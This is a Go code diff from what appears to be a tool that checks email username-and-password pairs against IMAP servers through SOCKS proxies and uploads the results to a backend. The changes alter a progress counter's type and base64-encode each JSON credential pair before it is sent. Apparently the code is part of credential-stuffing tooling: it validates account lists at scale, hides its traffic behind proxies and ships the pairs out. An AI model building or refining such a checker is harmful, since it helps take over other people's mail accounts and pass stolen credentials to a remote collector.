@@ -57,8 +57,8 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 			hostToGet := strings.Split(j.User, "@")[1]
 			hoster, ok := hosterData[hostToGet]
 			if !ok {
-				atomic.AddUint64(&lastline, 1) // add lastline
-				bar.Add(1)                     // Add processed mail to progressbar before continue the loop
+				atomic.AddInt32(&lastLine, 1) // add lastline
+				bar.Add(1)                    // Add processed mail to progressbar before continue the loop
 
 				log.Printf("%s not found", hostToGet)
 				smobj.notFoundCH <- j
@@ -87,16 +87,16 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 			// Now we call the IMAP Handler
 			valid, err := imaper.IMAPutil(socksAddr, addr, j.User, j.Pass)
 			if err != nil {
-				atomic.AddUint64(&lastline, 1) // add lastline
-				bar.Add(1)                     // Add processed mail to progressbar before continue the loop
+				atomic.AddInt32(&lastLine, 1) // add lastline
+				bar.Add(1)                    // Add processed mail to progressbar before continue the loop
 
 				log.Printf("%v : %s\n", err, j.User)
 				uploadHandle(j, smobj.uploadCH)
 				continue
 			}
 
-			atomic.AddUint64(&lastline, 1) // add lastline
-			bar.Add(1)                     // Add processed mail to progressbar before continue the loop
+			atomic.AddInt32(&lastLine, 1) // add lastline
+			bar.Add(1)                    // Add processed mail to progressbar before continue the loop
 
 			// When the result is valid, send the job in the resultCH channel to the writer function
 			switch valid {
@@ -250,7 +250,10 @@ func Uploader(ctx context.Context, smobj *sm, backend string, startCH <-chan str
 			jsonString, err := pair.Marshal()
 			utils.CheckError(err)
 
-			err = c.Send(jsonString)
+			// base64 encode jsonString
+			b64String := utils.Base64Encode(jsonString)
+
+			err = c.Send(b64String)
 			if debug {
 				utils.CheckError(err)
 			}
